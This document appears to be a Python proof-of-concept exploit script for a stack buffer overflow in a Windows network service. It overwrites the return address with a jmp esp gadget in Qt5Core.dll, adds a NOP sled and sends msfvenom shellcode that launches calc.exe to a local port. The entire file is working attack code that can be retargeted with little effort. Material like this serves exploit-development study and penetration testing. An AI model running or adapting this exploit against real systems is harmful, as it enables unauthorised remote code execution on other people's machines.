#!/usr/bin/env python3

import socket
from struct import pack

IP = "127.0.0.1"
port = 8888

# msfvenom -p 'windows/exec' CMD='calc.exe' -f 'python'
buf =  b""
buf += b"\xda\xcf\xbb\x44\xeb\x99\x5e\xd9\x74\x24\xf4\x5e"
buf += b"\x29\xc9\xb1\x30\x31\x5e\x18\x83\xc6\x04\x03\x5e"
buf += b"\x50\x09\x6c\xa2\xb0\x4f\x8f\x5b\x40\x30\x19\xbe"
buf += b"\x71\x70\x7d\xca\x21\x40\xf5\x9e\xcd\x2b\x5b\x0b"
buf += b"\x46\x59\x74\x3c\xef\xd4\xa2\x73\xf0\x45\x96\x12"
buf += b"\x72\x94\xcb\xf4\x4b\x57\x1e\xf4\x8c\x8a\xd3\xa4"
buf += b"\x45\xc0\x46\x59\xe2\x9c\x5a\xd2\xb8\x31\xdb\x07"
buf += b"\x08\x33\xca\x99\x03\x6a\xcc\x18\xc0\x06\x45\x03"
buf += b"\x05\x22\x1f\xb8\xfd\xd8\x9e\x68\xcc\x21\x0c\x55"
buf += b"\xe1\xd3\x4c\x91\xc5\x0b\x3b\xeb\x36\xb1\x3c\x28"
buf += b"\x45\x6d\xc8\xab\xed\xe6\x6a\x10\x0c\x2a\xec\xd3"
buf += b"\x02\x87\x7a\xbb\x06\x16\xae\xb7\x32\x93\x51\x18"
buf += b"\xb3\xe7\x75\xbc\x98\xbc\x14\xe5\x44\x12\x28\xf5"
buf += b"\x27\xcb\x8c\x7d\xc5\x18\xbd\xdf\x83\xdf\x33\x5a"
buf += b"\xe1\xe0\x4b\x65\x55\x89\x7a\xee\x3a\xce\x82\x25"
buf += b"\x7f\x20\xc9\x64\x29\xa9\x94\xfc\x68\xb4\x26\x2b"
buf += b"\xae\xc1\xa4\xde\x4e\x36\xb4\xaa\x4b\x72\x72\x46"
buf += b"\x21\xeb\x17\x68\x96\x0c\x32\x0b\x79\x9f\xde\xcc"

def exploit():
    offset = 1052
    buffer = b"A"*offset
    eip = pack('<L', 0x68F7BCDB) # Qt5Core.dll - jmp esp
    nop = b"\x90"*32
    payload = buffer + eip + nop + buf

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, port))
    s.send(payload)
    s.close()

exploit()